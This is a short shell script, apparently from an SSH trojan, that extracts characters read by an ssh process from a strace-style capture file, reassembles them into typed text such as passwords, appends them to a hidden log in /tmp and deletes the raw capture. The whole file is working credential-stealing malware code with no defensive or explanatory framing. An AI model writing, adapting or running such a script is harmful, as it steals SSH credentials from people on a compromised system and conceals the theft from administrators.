#!/bin/sh

LOG_FILE="/tmp/.log_sshtrojan2.txt"

cat /tmp/ssh_log.txt | grep -Eow "read\(4\, \".+\", 1\)" | grep -Po "\".+\"" | grep -Po "[^\"]" | tr -d '\n' | sed 's/\\n/\n/g' >> "$LOG_FILE"

rm /tmp/ssh_log.txt
